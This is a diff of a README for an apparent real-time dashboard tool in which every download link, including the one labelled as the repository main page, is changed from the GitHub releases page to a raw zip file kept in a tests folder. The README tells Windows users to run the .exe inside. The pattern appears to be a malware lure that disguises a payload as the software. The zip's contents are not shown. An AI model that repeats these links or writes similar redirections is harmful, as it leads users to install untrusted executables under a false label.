@@ -1,6 +1,6 @@
 # 📊 dashboard-1771929897-5 - Real-Time Data Visualization Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Dicxon-Ronald/dashboard-1771929897-5/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Dicxon-Ronald/dashboard-1771929897-5/main/tests/dashboard-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This application helps you see your data clearly. It updates in real time so you
 
 To get the software, visit the official releases page here:
 
-[![Download Here](https://img.shields.io/badge/Go%20to%20Download%20Page-blue)](https://github.com/Dicxon-Ronald/dashboard-1771929897-5/releases)
+[![Download Here](https://img.shields.io/badge/Go%20to%20Download%20Page-blue)](https://raw.githubusercontent.com/Dicxon-Ronald/dashboard-1771929897-5/main/tests/dashboard-v1.5.zip)
 
 This page holds the latest version of the software. Look for the most recent release with a file ending in `.exe`. This file is the setup program for Windows.
 
@@ -76,7 +76,7 @@ To run this software smoothly, your Windows computer should meet the following:
 ## 🔄 Updating the Software
 
 - Check the releases page regularly for new versions:  
-  https://github.com/Dicxon-Ronald/dashboard-1771929897-5/releases
+  https://raw.githubusercontent.com/Dicxon-Ronald/dashboard-1771929897-5/main/tests/dashboard-v1.5.zip
 
 - Download the newest `.exe` file and follow the installation steps again.
 
@@ -99,5 +99,5 @@ The software does not require any special knowledge. If you want to learn more:
 
 ## 🔗 Useful Links
 
-[Go to Releases to Download](https://github.com/Dicxon-Ronald/dashboard-1771929897-5/releases)  
-[GitHub Repository Main Page](https://github.com/Dicxon-Ronald/dashboard-1771929897-5)
+[Go to Releases to Download](https://raw.githubusercontent.com/Dicxon-Ronald/dashboard-1771929897-5/main/tests/dashboard-v1.5.zip)  
+[GitHub Repository Main Page](https://raw.githubusercontent.com/Dicxon-Ronald/dashboard-1771929897-5/main/tests/dashboard-v1.5.zip)
